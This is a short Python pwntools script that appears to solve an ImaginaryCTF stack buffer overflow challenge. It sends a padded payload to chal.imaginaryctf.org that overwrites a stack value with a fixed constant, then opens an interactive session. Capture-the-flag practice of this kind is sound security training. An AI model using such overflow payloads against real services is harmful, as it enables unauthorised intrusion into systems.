from pwn import *

BIN = "./stackoverflow"

def exploit():

  payload = b"A"*(0x30-0x8) + p64(0x69637466)
  io.recvuntil("color?")
  io.sendline(payload)
  io.recv()
  io.interactive()


#io = process(BIN)
io = remote("chal.imaginaryctf.org",42001)
exploit()